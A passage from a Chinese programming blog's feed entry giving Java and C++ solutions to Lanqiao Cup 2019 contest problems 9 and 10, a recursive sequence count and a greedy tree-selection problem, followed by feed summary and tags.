class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo09</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] = n; <span class="comment">// 第一项是n</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">a[<span class="number">1</span>] = i;<span class="comment">// 第二项有n种</span></span><br><span class="line">dfs(a,<span class="number">2</span>);<span class="comment">// 从第三项开始每一项都跟前两项有关</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(ans % <span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(Arrays.toString(a));</span></span><br><span class="line">print(a);</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">int</span> abs = Math.abs(a[n - <span class="number">1</span>] - a[n - <span class="number">2</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; abs;i++) &#123;</span><br><span class="line">a[n] = i;</span><br><span class="line">dfs(a,n + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = n;j &lt; a.length;j++) &#123;<span class="comment">// 后面置0，上一次递归可能改过第n项以后的值</span></span><br><span class="line">a[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; a.length;i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] != <span class="number">0</span>) &#123;</span><br><span class="line">System.out.print(a[i] + <span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(Arrays.toString(a));</span></span><br><span class="line">print(a, len);</span><br><span class="line">ans++;</span><br><span class="line"><span class="keyword">int</span> nabs = <span class="built_in">abs</span>(a[n - <span class="number">1</span>] - a[n - <span class="number">2</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nabs; i++) &#123;</span><br><span class="line">a[n] = i;</span><br><span class="line">dfs(a, n + <span class="number">1</span>, len);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &lt; len; j++) &#123;<span class="comment">// 后面置0，上一次递归可能改过第n项以后的值</span></span><br><span class="line">a[j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="number">1</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * n);<span class="comment">// 数组初始化0</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">0</span>] = n; <span class="comment">// 第一项是n</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">a[<span class="number">1</span>] = i;<span class="comment">// 第二项有n种</span></span><br><span class="line">dfs(a, <span class="number">2</span>, n);<span class="comment">// 从第三项开始每一项都跟前两项有关</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans % <span class="number">10000</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目10"><a href="#题目10" class="headerlink" title="题目10"></a>题目10</h2><blockquote><p>这个题忘记复制题目了，这个题是贪心算法</p></blockquote><p>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo10</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line">Tree ts[] = <span class="keyword">new</span> Tree[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">ts[i] = <span class="keyword">new</span> Tree();</span><br><span class="line">ts[i].x = input.nextInt();</span><br><span class="line">ts[i].y = input.nextInt();</span><br><span class="line">ts[i].r = input.nextInt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">HashSet&lt;Tree&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; n;j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (judge(ts[i],ts[j])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ts[i].r &gt; ts[j].r) &#123;</span><br><span class="line">set.add(ts[i]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">set.add(ts[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">set.add(ts[i]);</span><br><span class="line">set.add(ts[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Tree t : set) &#123;</span><br><span class="line">ans += t.r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">judge</span><span class="params">(Tree t1, Tree t2)</span> </span>&#123;</span><br><span class="line"><span class="keyword">double</span> x = t1.x - t2.x;</span><br><span class="line"><span class="keyword">double</span> y = t1.y - t2.y;</span><br><span class="line"><span class="keyword">double</span> dis = Math.sqrt(x * x + y * y);</span><br><span class="line"><span class="keyword">return</span> dis &lt; t1.r + t2.r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Tree</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> prime = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">result = prime * result + r;</span><br><span class="line">result = prime * result + x;</span><br><span class="line">result = prime * result + y;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">Tree other = (Tree) obj;</span><br><span class="line"><span class="keyword">if</span> (r != other.r)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (x != other.x)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (y != other.y)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Tree [x="</span> + x + <span class="string">", y="</span> + y + <span class="string">", r="</span> + r + <span class="string">"]"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tree</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">equals</span><span class="params">(Tree obj)</span> </span>&#123;</span><br><span class="line">Tree other = obj;</span><br><span class="line"><span class="keyword">if</span> (r != other.r)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (x != other.x)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (y != other.y)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">stringstream</span> s1;</span><br><span class="line">s1 &lt;&lt; <span class="string">"Tree [x="</span> &lt;&lt; x &lt;&lt; <span class="string">", y="</span> &lt;&lt; y &lt;&lt; <span class="string">", r="</span> &lt;&lt; r &lt;&lt; <span class="string">"]"</span>;</span><br><span class="line"><span class="keyword">return</span> s1.str();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeFunctor</span> &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> Tree &amp;left, <span class="keyword">const</span> Tree &amp;right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (left.x &lt; right.x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(Tree t1, Tree t2)</span> </span>&#123;</span><br><span class="line"><span class="keyword">double</span> x = t1.x - t2.x;</span><br><span class="line"><span class="keyword">double</span> y = t1.y - t2.y;</span><br><span class="line"><span class="keyword">double</span> dis = <span class="built_in">sqrt</span>(x * x + y * y);</span><br><span class="line"><span class="keyword">return</span> dis &lt; t1.r + t2.r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">Tree ts[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; ts[i].x &gt;&gt; ts[i].y &gt;&gt; ts[i].r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">set</span>&lt;Tree,TreeFunctor&gt; se;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (judge(ts[i], ts[j])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ts[i].r &gt; ts[j].r) &#123;</span><br><span class="line">se.insert(ts[i]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">se.insert(ts[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">se.insert(ts[i]);</span><br><span class="line">se.insert(ts[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&lt;Tree,TreeFunctor&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span> (it = se.begin(); it != se.end(); it++) &#123;</span><br><span class="line">ans += (*it).r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一共十个题，都比较好做&lt;/p&gt;
&lt;h2 id=&quot;题目1&quot;&gt;&lt;a href=&quot;#题目1&quot; class=&quot;headerlink&quot; title=&quot;题目1&quot;&gt;&lt;/a&gt;题目1&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;问题描述&lt;br&gt;　　在计算机存储中，15.125GB是多少MB？&lt;/
      
    
    </summary>
    
      <category term="数据结构与算法" scheme="https://blog.zimo.wiki/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="java" scheme="https://blog.zimo.wiki/tags/java/"/>
    
      <category term="算法" scheme="https://blog.zimo.wiki/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="蓝桥杯" scheme="https://blog.zimo.wiki/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
      <category term="题解" scheme="https://blog.zimo.wiki/tags/%E9%A2%98%E8%A7%A3/"/>
    
      <category term="c++" scheme="https://blog.zimo.wiki/tags/c/"/>
    
  </entry>
  
</feed>
